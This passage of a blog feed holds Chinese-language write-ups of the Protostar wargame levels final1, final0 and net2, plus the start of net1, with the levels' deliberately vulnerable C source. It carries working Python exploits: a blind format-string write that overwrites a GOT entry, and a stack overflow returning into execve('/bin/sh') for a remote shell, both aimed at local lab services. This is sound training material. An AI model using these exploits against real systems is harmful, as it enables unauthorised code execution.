socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">2994</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_until</span><span class="params">(check)</span>:</span></span><br><span class="line">        buffer = <span class="string">''</span></span><br><span class="line">        <span class="keyword">while</span> check <span class="keyword">not</span> <span class="keyword">in</span> buffer:</span><br><span class="line">                buffer += s.recv(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> buffer</span><br><span class="line"></span><br><span class="line">strncmp = struct.pack(<span class="string">"I"</span>, <span class="number">0x804a1a8</span>)</span><br><span class="line"></span><br><span class="line">ip, port = s.getsockname()</span><br><span class="line">hostname = ip + <span class="string">":"</span> + str(port)</span><br><span class="line">padding = <span class="string">"A"</span>*(<span class="number">24</span>-len(hostname))</span><br><span class="line"></span><br><span class="line">username = padding + <span class="string">"BBBB"</span> + <span class="string">"%08x "</span>*<span class="number">20</span></span><br><span class="line">login = <span class="string">"CCCC"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> read_until(<span class="string">"[final1] $ "</span>)</span><br><span class="line">s.send(<span class="string">'username '</span> + username + <span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">print</span> read_until(<span class="string">"[final1] $ "</span>)</span><br><span class="line">s.send(<span class="string">'login '</span> + login + <span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">print</span> read_until(<span class="string">"[final1] $ "</span>)</span><br><span class="line">raw_input(<span class="string">'wait here...'</span>)</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/final1_6.jpg" data-fancybox="group" data-caption="final1_6" class="fancybox"><img alt="final1_6" title="final1_6" data-src="https://dblu3.github.io/img/Protostar/final1_6.jpg" class="lazyload"></a></p><p>查看strncmp(0x804a1a8)上的数据<br><a href="https://dblu3.github.io/img/Protostar/final1_7.jpg" data-fancybox="group" data-caption="final1_7" class="fancybox"><img alt="final1_7" title="final1_7" data-src="https://dblu3.github.io/img/Protostar/final1_7.jpg" class="lazyload"></a></p><p>计算出偏移后完善exp</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">2994</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_until</span><span class="params">(check)</span>:</span></span><br><span class="line">        buffer = <span class="string">''</span></span><br><span class="line">        <span class="keyword">while</span> check <span class="keyword">not</span> <span class="keyword">in</span> buffer:</span><br><span class="line">                buffer += s.recv(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> buffer</span><br><span class="line"></span><br><span class="line">strncmp = struct.pack(<span class="string">"I"</span>, <span class="number">0x804a1a8</span>)</span><br><span class="line">ip, port = s.getsockname()</span><br><span class="line">hostname = ip + <span class="string">":"</span> + str(port)</span><br><span class="line">padding = <span class="string">"A"</span>*(<span class="number">24</span>-len(hostname))</span><br><span class="line"></span><br><span class="line">username = padding + <span class="string">"BBBB"</span> + strncmp + <span class="string">"%17$65407x "</span> + <span class="string">"%18$08n  "</span> </span><br><span class="line">+ struct.pack(<span class="string">"I"</span>, <span class="number">0x804a1a8</span>+<span class="number">2</span>) + <span class="string">"%17$47157x "</span> + <span class="string">"%24$08n"</span></span><br><span class="line"></span><br><span class="line">login = <span class="string">"CCCC"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> read_until(<span class="string">"[final1] $ "</span>)</span><br><span class="line">s.send(<span class="string">'username '</span> + username + <span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">print</span> read_until(<span class="string">"[final1] $ "</span>)</span><br><span class="line">s.send(<span class="string">'login '</span> + login + <span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">print</span> read_until(<span class="string">"[final1] $ "</span>)</span><br><span class="line"><span class="comment"># raw_input('wait here...')</span></span><br><span class="line"></span><br><span class="line">t = telnetlib.Telnet()</span><br><span class="line">t.sock = s</span><br><span class="line">t.interact()</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/final1_8.jpg" data-fancybox="group" data-caption="final1_8" class="fancybox"><img alt="final1_8" title="final1_8" data-src="https://dblu3.github.io/img/Protostar/final1_8.jpg" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Final1&quot;&gt;&lt;a href=&quot;#Final1&quot; class=&quot;headerlink&quot; title=&quot;Final1&quot;&gt;&lt;/a&gt;Final1&lt;/h1&gt;&lt;p&gt;Final1: remote blind format string&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Protostar_final0</title>
    <link href="http://yoursite.com/2018/09/22/Protostar-final0/"/>
    <id>http://yoursite.com/2018/09/22/Protostar-final0/</id>
    <published>2018-09-22T08:28:58.000Z</published>
    <updated>2018-09-22T13:09:15.052Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Final0"><a href="#Final0" class="headerlink" title="Final0"></a>Final0</h1><p>Final0: combines a stack overflow and network programming for a remote overflow</p><a id="more"></a><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>Final0</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../common/common.c"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NAME <span class="meta-string">"final0"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GID 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 2995</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Read the username in from the network</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">get_username</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">512</span>];</span><br><span class="line">  <span class="keyword">char</span> *q;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(<span class="built_in">buffer</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="built_in">buffer</span>));</span><br><span class="line">  gets(<span class="built_in">buffer</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Strip off trailing new line characters */</span></span><br><span class="line">  q = <span class="built_in">strchr</span>(<span class="built_in">buffer</span>, <span class="string">'\n'</span>);</span><br><span class="line">  <span class="keyword">if</span>(q) *q = <span class="number">0</span>;</span><br><span class="line">  q = <span class="built_in">strchr</span>(<span class="built_in">buffer</span>, <span class="string">'\r'</span>);</span><br><span class="line">  <span class="keyword">if</span>(q) *q = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Convert to lower case */</span></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(<span class="built_in">buffer</span>); i++) &#123;</span><br><span class="line">      <span class="built_in">buffer</span>[i] = <span class="built_in">toupper</span>(<span class="built_in">buffer</span>[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Duplicate the string and return it */</span></span><br><span class="line">  <span class="keyword">return</span> strdup(<span class="built_in">buffer</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">char</span> *username;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Run the process as a daemon */</span></span><br><span class="line">  background_process(NAME, UID, GID); </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Wait for socket activity and return */</span></span><br><span class="line">  fd = serve_forever(PORT);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set the client socket to STDIN, STDOUT, and STDERR */</span></span><br><span class="line">  set_io(fd);</span><br><span class="line"></span><br><span class="line">  username = get_username();</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"No such user %s\n"</span>, username);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Hints"><a href="#Hints" class="headerlink" title="Hints"></a>Hints</h2><ul><li>depending on where you are returning to, you may wish to use a toupper() proof shellcode.</li><li>Core files will be in /tmp</li></ul><h2 id="Padding"><a href="#Padding" class="headerlink" title="Padding"></a>Padding</h2><p><a href="https://dblu3.github.io/img/Protostar/final0_1.jpg" data-fancybox="group" data-caption="final0_1" class="fancybox"><img alt="final0_1" title="final0_1" data-src="https://dblu3.github.io/img/Protostar/final0_1.jpg" class="lazyload"></a><br>计算出偏移是532</p><p>验证一下<br><a href="https://dblu3.github.io/img/Protostar/final0_2.jpg" data-fancybox="group" data-caption="final_2" class="fancybox"><img alt="final_2" title="final_2" data-src="https://dblu3.github.io/img/Protostar/final0_2.jpg" class="lazyload"></a></p><h2 id="Execve"><a href="#Execve" class="headerlink" title="Execve"></a>Execve</h2><p>找到<code>execve()</code>的地址<br><a href="https://dblu3.github.io/img/Protostar/final0_3.jpg" data-fancybox="group" data-caption="final0_3" class="fancybox"><img alt="final0_3" title="final0_3" data-src="https://dblu3.github.io/img/Protostar/final0_3.jpg" class="lazyload"></a></p><h2 id="Base-of-libc"><a href="#Base-of-libc" class="headerlink" title="Base of libc"></a>Base of libc</h2><p><a href="https://dblu3.github.io/img/Protostar/final0_4.jpg" data-fancybox="group" data-caption="final0_4" class="fancybox"><img alt="final0_4" title="final0_4" data-src="https://dblu3.github.io/img/Protostar/final0_4.jpg" class="lazyload"></a></p><h2 id="Offset-of-bin-sh"><a href="#Offset-of-bin-sh" class="headerlink" title="Offset of /bin/sh"></a>Offset of /bin/sh</h2><p>找到<code>/bin/sh</code>的偏移量<br><a href="https://dblu3.github.io/img/Protostar/final0_5.jpg" data-fancybox="group" data-caption="final0_5" class="fancybox"><img alt="final0_5" title="final0_5" data-src="https://dblu3.github.io/img/Protostar/final0_5.jpg" class="lazyload"></a></p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">2995</span>))</span><br><span class="line"></span><br><span class="line">padding = <span class="string">"a"</span>*<span class="number">532</span></span><br><span class="line">libc_base = <span class="number">0xb7e97000</span></span><br><span class="line">offset_bin_sh = <span class="number">1176511</span></span><br><span class="line">execve = <span class="number">0x08048c0c</span></span><br><span class="line"></span><br><span class="line">exp = padding</span><br><span class="line">exp += struct.pack(<span class="string">"I"</span>, execve)</span><br><span class="line">exp += <span class="string">"AAAA"</span> <span class="comment"># junk</span></span><br><span class="line">exp += struct.pack(<span class="string">"I"</span>, libc_base + offset_bin_sh)</span><br><span class="line">exp += <span class="string">"\x00"</span>*<span class="number">8</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] EXP: "</span></span><br><span class="line"><span class="keyword">print</span> exp</span><br><span class="line"></span><br><span class="line">s.send(exp + <span class="string">"\n"</span>)</span><br><span class="line">s.send(<span class="string">"id \n"</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] Recv: "</span></span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">t = telnetlib.Telnet()</span><br><span class="line">t.sock = s</span><br><span class="line">t.interact()</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/final0_6.jpg" data-fancybox="group" data-caption="final0_6" class="fancybox"><img alt="final0_6" title="final0_6" data-src="https://dblu3.github.io/img/Protostar/final0_6.jpg" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Final0&quot;&gt;&lt;a href=&quot;#Final0&quot; class=&quot;headerlink&quot; title=&quot;Final0&quot;&gt;&lt;/a&gt;Final0&lt;/h1&gt;&lt;p&gt;Final0: combines a stack overflow and network programming for a remote overflow&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Protostar_net2</title>
    <link href="http://yoursite.com/2018/09/18/Protostar-net2/"/>
    <id>http://yoursite.com/2018/09/18/Protostar-net2/</id>
    <published>2018-09-18T08:34:20.000Z</published>
    <updated>2018-09-18T08:53:29.350Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Net2"><a href="#Net2" class="headerlink" title="Net2"></a>Net2</h1><p>Net2: add up 4 unsigned 32-bit integers<br>跟net1相差不大，不多废话</p><a id="more"></a><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>Net2</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../common/common.c"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NAME <span class="meta-string">"net2"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID 997</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GID 997</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 2997</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> quad[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result, wanted;</span><br><span class="line"></span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">      quad[i] = <span class="built_in">random</span>();</span><br><span class="line">      result += quad[i];</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">write</span>(<span class="number">0</span>, &amp;(quad[i]), <span class="keyword">sizeof</span>(result)) != <span class="keyword">sizeof</span>(result)) &#123;</span><br><span class="line">          errx(<span class="number">1</span>, <span class="string">":(\n"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">read</span>(<span class="number">0</span>, &amp;wanted, <span class="keyword">sizeof</span>(result)) != <span class="keyword">sizeof</span>(result)) &#123;</span><br><span class="line">      errx(<span class="number">1</span>, <span class="string">":&lt;\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(result == wanted) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you added them correctly\n"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"sorry, try again. invalid\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">char</span> *username;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Run the process as a daemon */</span></span><br><span class="line">  background_process(NAME, UID, GID); </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Wait for socket activity and return */</span></span><br><span class="line">  fd = serve_forever(PORT);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set the client socket to STDIN, STDOUT, and STDERR */</span></span><br><span class="line">  set_io(fd);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Don't do this :&gt; */</span></span><br><span class="line">  srandom(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">run</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Hint"><a href="#Hint" class="headerlink" title="Hint"></a>Hint</h2><ul><li>Keep in mind that it wraps</li></ul><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"127.0.0.1"</span>, <span class="number">2997</span>))</span><br><span class="line"></span><br><span class="line">n = s.recv(<span class="number">4</span>)</span><br><span class="line">n += s.recv(<span class="number">4</span>)</span><br><span class="line">n += s.recv(<span class="number">4</span>)</span><br><span class="line">n += s.recv(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] n: "</span> + n</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] repr(n): "</span> + repr(n)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] Hex: "</span> + n.encode(<span class="string">'hex'</span>)</span><br><span class="line">N = struct.unpack(<span class="string">"IIII"</span>,n)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] N: "</span></span><br><span class="line"><span class="keyword">print</span> N</span><br><span class="line">sumofN = sum(N)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] sum: "</span></span><br><span class="line"><span class="keyword">print</span> sumofN</span><br><span class="line">s.send(struct.pack(<span class="string">"I"</span>, sumofN))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] Recv: "</span> + s.recv(<span class="number">1024</span>)</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/net2_1.jpg" data-fancybox="group" data-caption="net2_1" class="fancybox"><img alt="net2_1" title="net2_1" data-src="https://dblu3.github.io/img/Protostar/net2_1.jpg" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Net2&quot;&gt;&lt;a href=&quot;#Net2&quot; class=&quot;headerlink&quot; title=&quot;Net2&quot;&gt;&lt;/a&gt;Net2&lt;/h1&gt;&lt;p&gt;Net2: add up 4 unsigned 32-bit integers&lt;br&gt;跟net1相差不大，不多废话&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Protostar_net1</title>
    <link href="http://yoursite.com/2018/09/18/Protostar-net1/"/>
    <id>http://yoursite.com/2018/09/18/Protostar-net1/</id>
    <published>2018-09-18T07:58:34.000Z</published>
    <updated>2018-09-18T08:51:55.165Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Net1"><a href="#Net1" class="headerlink" title="Net1"></a>Net1</h1><p>Net1: convert binary integers into ascii<br>跟net0没太大差别，直接写个脚本就行了</p><a id="more"></a><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>Net1</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../common/common.c"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NAME <span class="meta-string">"net1"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID 998</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GID 998</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 2998</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">12</span>];</span><br><span class="line">  <span class="keyword">char</span> fub[<span class="number">12</span>];</span><br><span class="line">  <span class="keyword">char</span> *q;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> wanted;</span><br><span class="line"></span><br><span class="line">  wanted = <span class="built_in">random</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">sprintf</span>(fub, <span class="string">"%d"</span>, wanted);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">write</span>(<span class="number">0</span>, &amp;wanted, <span class="keyword">sizeof</span>(wanted)) != <span class="keyword">sizeof</span>(wanted)) &#123;</span><br><span class="line">      errx(<span class="number">1</span>, <span class="string">":(\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(fgets(buf, <span class="keyword">sizeof</span>(buf)<span class="number">-1</span>, <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      errx(<span class="number">1</span>, <span class="string">":(\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  q = <span class="built_in">strchr</span>(buf, <span class="string">'\r'</span>); <span class="keyword">if</span>(q) *q = <span class="number">0</span>;</span><br><span class="line">  q = <span class="built_in">strchr</span>(buf, <span class="string">'\n'</span>); <span class="keyword">if</span>(q) *q = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">strcmp</span>(fub, buf) == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you correctly sent the data\n"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you didn't send the data properly\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">char</span> 